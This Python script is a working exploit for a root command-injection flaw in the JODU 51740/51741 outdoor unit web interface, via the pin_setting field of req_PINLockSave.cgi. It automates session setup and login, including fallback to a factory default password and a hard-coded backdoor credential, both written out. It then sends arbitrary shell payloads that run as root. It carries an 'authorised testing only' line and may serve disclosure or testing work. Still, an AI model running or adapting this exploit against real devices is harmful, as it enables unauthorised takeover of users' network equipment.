#!/usr/bin/env python3
# SPDX-License-Identifier: MIT
# Copyright (c) 2026 @jxyass11
"""
jodu5174x_pinlock_rce.py - JODU 51740 / 51741 WebUI root command injection.

Route  : POST /cgi-bin/cgi/req_PINLockSave.cgi
Bug    : `pin_setting` is only emptiness-checked, then interpolated into
         `3gcmif pin_setting -p1 "%s" -p2 "%s" 2>/dev/null` and executed via
         utl_systemCmd() -> popen("/bin/sh -c"). Command substitution inside the
         double quotes runs as root.

The payload is whatever you pass to --cmd. Pass the full shell payload
(e.g. '$(id)') or a bare command (e.g. 'id'); a bare command is wrapped in
$(...). Nothing is hardcoded.

Password order: supplied password, then factory default, then the hard-coded
credential in app/account/auth.

Usage:
    python3 jodu5174x_pinlock_rce.py https://192.168.1.1 --ask-pass \
        --cmd '$(id)'
    python3 jodu5174x_pinlock_rce.py 192.168.1.1 --password 'my-Pw' \
        --cmd '$(id > /tmp/cgi_pwn)'

Requires only the Python 3 standard library.
Authorised testing only.
"""

import argparse
import getpass
import json
import re
import ssl
import sys
import urllib.error
import urllib.request
import http.cookiejar

MAX_PIN_SETTING = 75          # __sprintf_chk destination is 128 bytes total
TOKEN_RE = re.compile(r'"RequestVerifyToken"\s*:\s*"([^"]*)"')
FACTORY_PASSWORD = "Jiocentrum"


def normalize_target(target):
    """Accept host, host:port, IPv4, IPv6 and bracketed IPv6, with or without scheme."""
    t = target.strip().rstrip("/")
    scheme = "https"
    if "://" in t:
        scheme, t = t.split("://", 1)

    if t.startswith("["):                       # already bracketed (may carry :port)
        host = t
    elif t.count(":") >= 2:                     # bare IPv6 literal -> bracket it
        host = f"[{t}]"
    else:
        host = t

    # Zone id for link-local: fe80::1%eth0 -> fe80::1%25eth0
    if "%" in host and "%25" not in host:
        host = host.replace("%", "%25")

    return f"{scheme}://{host}"


class Exploit:
    def __init__(self, target, timeout=10.0, verbose=False):
        self.base = normalize_target(target)
        self.timeout = timeout
        self.verbose = verbose

        self.jar = http.cookiejar.CookieJar()
        ctx = ssl._create_unverified_context()     # self-signed device cert
        self.opener = urllib.request.build_opener(
            urllib.request.HTTPCookieProcessor(self.jar),
            urllib.request.HTTPSHandler(context=ctx),
        )

    # -- transport ---------------------------------------------------------
    def post(self, path, body):
        url = self.base + path
        data = json.dumps(body).encode()
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        if self.verbose:
            print(f"    >> POST {path} {json.dumps(body)}")
        try:
            with self.opener.open(req, timeout=self.timeout) as r:
                text = r.read().decode("utf-8", "replace")
        except urllib.error.HTTPError as e:
            text = e.read().decode("utf-8", "replace")
            if self.verbose:
                print(f"    << HTTP {e.code}")
        except (urllib.error.URLError, OSError) as e:
            raise SystemExit(f"[!] cannot reach {url}: {e}")
        if self.verbose:
            print(f"    << {text[:400]}")
        return text

    @staticmethod
    def token_of(text):
        m = TOKEN_RE.search(text)
        return m.group(1) if m else None

    @staticmethod
    def is_gate_page(text):
        return "topReturn" in text

    # -- auth --------------------------------------------------------------
    def login_once(self, pre_token, password):
        r = self.post("/cgi-bin/cgi/login_req.cgi", {
            "RequestVerifyToken": pre_token or "",
            "usr": "Admin",
            "pwd": password,
        })
        tok = self.token_of(r)
        if not tok:
            print(f"    <- {r[:300]}")
        return tok

    def backdoor(self):
        print("[!] no password worked; trying the hard-coded credential")
        self.post("/cgi-bin/app/account/auth",
                  {"usr": "Admin", "pwd": FACTORY_PASSWORD})
        r = self.post("/cgi-bin/cgi/req_PINLockSave.cgi", {})
        return self.token_of(r)

    def open_session(self, candidates):
        print("[*] step 1: token_query.cgi (open session, pre-login token)")
        r = self.post("/cgi-bin/cgi/token_query.cgi", {})
        t0 = self.token_of(r)
        if self.is_gate_page(r):
            print("[!] unexpected gate page from token_query.cgi")
        if not t0:
            print(f"    <- {r[:300]}")
        print(f"    pre-login token: {t0 or '<none>'}")

        tok = None
        for label, pw in candidates:
            print(f"[*] step 2: login_req.cgi (password: {label})")
            tok = self.login_once(t0, pw)
            if tok:
                break
            print("    login rejected")

        if not tok:
            tok = self.backdoor()

        if not tok:
            raise SystemExit("[!] could not obtain a session token")
        print(f"    session token  : {tok}")
        return tok

    # -- exploit -----------------------------------------------------------
    def inject(self, token, pin_setting):
        body = {
            "RequestVerifyToken": token,
            "pin_setting": pin_setting,
            "pin_code": "1234",          # passes check_pin: digits, len 4
        }
        print(f"[*] step 3: pin_setting = {pin_setting}")
        return self.post("/cgi-bin/cgi/req_PINLockSave.cgi", body)

    def run(self, candidates, check):
        token = self.open_session(candidates)

        r = self.inject(token, check)
        print(f"    <- {r[:400]}")

        if "Invalid token" in r:
            nxt = self.token_of(r)
            if nxt:
                print("[*] token rotated; retrying once")
                r = self.inject(nxt, check)
                print(f"    <- {r[:400]}")

        if self.is_gate_page(r):
            raise SystemExit(
                "[!] session gate page returned - cookie was not replayed, "
                "nothing executed")

        print("\n[+] request completed. The handler answers only after popen() "
              "returns, so a JSON reply means the payload ran.")
        return 0


def build_payload(args):
    """Return the pin_setting value: a full $(...) payload, or a wrapped command."""
    raw = args.cmd.strip()

    # cmd.exe does not treat single quotes as quoting, so a pasted
    # '$(id)' arrives with the quotes included. Strip one matching pair.
    if len(raw) >= 2 and raw[0] == raw[-1] and raw[0] in "'\"":
        raw = raw[1:-1].strip()

    if not raw:
        raise SystemExit("[!] --cmd is empty")

    if (raw.startswith("$(") and raw.endswith(")")) or \
       (raw.startswith("`") and raw.endswith("`")):
        payload = raw                       # already a substitution
    else:
        payload = f"$({raw})"               # bare command -> $(command)

    if '"' in payload:
        raise SystemExit("[!] payload may not contain a double quote")
    if len(payload) > MAX_PIN_SETTING:
        raise SystemExit(
            f"[!] payload too long ({len(payload)}); keep pin_setting under "
            f"{MAX_PIN_SETTING} chars")
    return payload


def password_candidates(args):
    """Ordered (label, password) pairs: supplied, factory, then backdoor."""
    cands = []
    if args.ask_pass:
        typed = getpass.getpass("WebUI password: ")
        if typed:
            cands.append(("supplied", typed))
    elif args.password:
        cands.append(("supplied", args.password))

    if not any(pw == FACTORY_PASSWORD for _lbl, pw in cands):
        cands.append(("factory default", FACTORY_PASSWORD))
    return cands


def main():
    ap = argparse.ArgumentParser(
        description="JODU 51740/51741 WebUI root command injection (req_PINLockSave.cgi)")
    ap.add_argument("target",
                    help="ODU address, e.g. https://192.168.1.1 or https://[2001:db8::1]")
    ap.add_argument("--password", help="your WebUI password (custom admin password)")
    ap.add_argument("--ask-pass", action="store_true",
                    help="prompt for the WebUI password instead of passing it on argv")
    ap.add_argument("--cmd", required=True,
                    help="payload to run as root; '$(...)' is sent as-is, "
                         "a bare command is wrapped in $(...)")
    ap.add_argument("--timeout", type=float, default=10.0)
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()

    check = build_payload(args)
    cands = password_candidates(args)

    print("JODU 5174x PIN-lock RCE")
    print(f"target : {args.target}")
    print(f"payload: {check}")
    print()

    ex = Exploit(args.target, timeout=args.timeout, verbose=args.verbose)
    return ex.run(cands, check)


if __name__ == "__main__":
    sys.exit(main())
